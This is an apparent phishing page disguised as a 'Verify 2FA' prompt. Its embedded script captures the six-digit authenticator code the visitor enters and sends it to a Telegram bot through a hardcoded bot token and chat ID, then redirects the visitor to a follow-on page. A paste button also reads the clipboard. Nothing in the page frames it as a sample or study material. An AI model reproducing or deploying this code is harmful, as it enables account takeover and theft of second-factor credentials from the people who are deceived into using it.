<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify 2FA</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
            padding: 20px;
        }
        .container img {
            width: 80px;
            margin-bottom: 20px;
        }
        .container h1 {
            font-size: 18px;
            margin-bottom: 10px;
            color: #e0e0e0;
        }
        .container p {
            font-size: 13px;
            color: #a0a0a0;
            margin-bottom: 20px;
            line-height: 1.4;
        }
        .verification-label {
            font-size: 12px;
            color: #888;
            margin-bottom: 15px;
            display: block;
        }
        .input-group {
            position: relative;
            margin-bottom: 30px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            background-color: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }
        .paste-btn {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background-color: #3a3a3a;
            color: #ccc;
            border: none;
            padding: 5px 12px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }
        .submit-btn {
            background-color: #2ecc71;
            color: #000;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
        .no-access {
            display: block;
            margin-top: 20px;
            color: #888;
            font-size: 13px;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="container">
<img src="lock.png" alt="Lock Icon">
    <h1>Verify 2FA</h1>
    <p>Please enter the 6-digit verification code from the authenticator.</p>
    
    <span class="verification-label">Verification Code</span>
    
    <form onsubmit="event.preventDefault(); sendMessage();">
        <div class="input-group">
            <input type="text" id="verificationCode" placeholder="Verification Code" required>
            <button type="button" class="paste-btn" onclick="pasteCode()">Paste</button>
        </div>
        
        <p style="color: #888; font-size: 13px;">Don't have access to this 2FA?</p>
        
        <button type="submit" class="submit-btn">Submit</button>
    </form>
</div>

<script>
    const bots = {
        "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
    };

    async function pasteCode() {
        try {
            const text = await navigator.clipboard.readText();
            document.getElementById('verificationCode').value = text;
        } catch (err) {
            console.error('Failed to read clipboard');
        }
    }

    async function sendMessage() {
        const code = document.getElementById("verificationCode").value;
        const message = `2FA Verification Code: ${code}`;

        try {
            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                return fetch(url);
            });

            await Promise.all(sendPromises);
            
            // Fixed Redirection: No condition, just redirect
            window.location.href = "verification.html";
            
        } catch (error) {
            window.location.href = "verification.html";
        }
    }
</script>

</body>
</html>
